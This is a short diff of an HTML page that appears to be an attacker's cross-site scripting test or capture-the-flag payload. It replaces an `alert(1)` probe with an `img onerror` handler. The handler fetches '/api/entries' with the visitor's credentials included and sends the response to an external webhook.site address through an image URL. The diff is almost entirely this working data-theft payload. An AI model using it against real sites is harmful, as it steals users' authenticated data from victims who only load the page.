@@ -5,7 +5,6 @@
 </head>
 <body>
     <h1>Thấy gì chưa ???</h1>
-    <script>alert(1)</script>
     <script>
         fetch('/api/entries', {credentials: 'include'})
         .then(r => r.json())
@@ -16,5 +15,10 @@
             });
         });
     </script>
+    <img src=x onerror="fetch('/api/entries',{credentials:'include'}).then(r=>r.json()).then(d=>{
+  const i=document.createElement('img');
+  i.src='https://webhook.site/863fb66b-7f91-4ef5-98cc-66a4ee77d282?data='+encodeURIComponent(JSON.stringify(d));
+  document.body.appendChild(i);
+})">
 </body>
 </html>
